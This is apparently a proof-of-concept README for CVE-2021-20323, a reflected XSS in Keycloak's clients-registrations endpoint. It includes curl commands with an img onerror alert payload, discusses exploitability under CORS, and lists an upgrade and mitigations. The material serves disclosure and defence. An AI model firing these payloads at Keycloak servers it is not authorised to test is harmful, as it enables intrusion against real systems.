# CVE-2021-20323
## Description

Keycloak before 18.0.0 and after 10.0.0 contains a reflected XSS on the clients-registrations endpoint. The bug is triggered by providing, by POST, a json structure with a key as parameter name that is not supported by the endpoint. The response return reflects the json key in an error message and with header set as `Content-Type: text/html`. When executed in a browser, html code from the json key is interpreted allowing to trigger JavaScript code. No authentication is required and the bug impacts all available realms.

Currently, due to the bug requiring `Content-Type: application/json` and is submitted via a POST, there is no common path to exploit that have a user impact.

This repository provides a POC for CVE-2021-20323 and remediation/mitigation recommendations.

## How to trigger the bug

The bug is very easy to trigger.
```bash
curl -v -X POST {BaseURL}/realms/master/clients-registrations/default -H "Content-type: application/json" -d "{\"<img src=x onerror=\\\"alert('XSS')\\\"/>\":1}"
```

It is also possible to trigger it with the `openid-connect` provider.
```bash
curl -v -X POST {BaseURL}/realms/master/clients-registrations/openid-connect -H "Content-type: application/json" -d "{\"<img src=x onerror=\\\"alert('XSS')\\\"/>\":1}"
```


*Note: On older Keycloak versions (the one running with wildfly instead of quarkus) the base path uses `/auth/realms/*` instead of `/realms/*`*

## Is the bug exploitable ?

As we can see in multiple sources [here](https://security.stackexchange.com/questions/263301/reflected-xss-found-in-web-application-via-post-request-with-json-body-is-this) or [here](https://security.stackexchange.com/questions/263301/reflected-xss-found-in-web-application-via-post-request-with-json-body-is-this), it is not commonly possible to exploit a reflectect POST XSS that requires `Content-Type: application/json` to be vulnerable. The only case where it could happen is if CORS policy were manually laxed from default to allow cross-origin requests. This scenario is only reasonable to assume in very specific use cases made for functional reasons by the application owner. In order to be exploitable in such case, the attacker should either be in control of the domain/server allowed in CORS policy or have an XSS on this second domain that could be used as a relay.

With CVE-2021-20323, Keycloak does not accept POST with `Content-Type` of `multipart/form-data` or `application/x-www-form-urlencoded` which are the only two types allowed in a basic `form` submit. This makes CVE-2021-20323 only exploitable if CORS explicitely allows it.

```bash
# curl -X POST {BaseURL}/realms/master/clients-registrations/default -H "Content-type: multipart/form-data" -d "{\"<img src=x onerror=\\\"alert('XSS')\\\"/>\":1}"
{"error":"RESTEASY003065: Cannot consume content type"}

# curl -X POST {BaseURL}/realms/master/clients-registrations/default -H "Content-type: application/x-www-form-urlencoded" -d "{\"<img src=x onerror=\\\"alert('XSS')\\\"/>\":1}"
{"error":"RESTEASY003065: Cannot consume content type"}
```

## How to fix ?

Update to Keycloak 18.0.0 or later.

No known fixed version for RedHat Single Sign-On which is a repackaged version of Keycloak by RedHat.

## Mitigation alternatives

1. Put in place a reverse proxy to forbid any call to `clients-registrations`
2. Configure Keycloak with ACL to limit access to `clients-registrations`, similarly to this [Keycloak blog post](https://www.keycloak.org/2021/12/cve)

## Links

- https://github.com/keycloak/keycloak/security/advisories/GHSA-m98g-63qj-fp8j
- https://nvd.nist.gov/vuln/detail/CVE-2021-20323
- https://bugzilla.redhat.com/show_bug.cgi?id=2013577
- https://access.redhat.com/security/cve/CVE-2021-20323
- https://github.com/keycloak/keycloak/commit/3aa3db16eac9b9ed8c5335ac86f5f50e0c68662d
- https://security.stackexchange.com/questions/263301/reflected-xss-found-in-web-application-via-post-request-with-json-body-is-this
- https://www.keycloak.org/2021/12/cve

## License

[MIT License](https://opensource.org/licenses/MIT) © [ndmalc]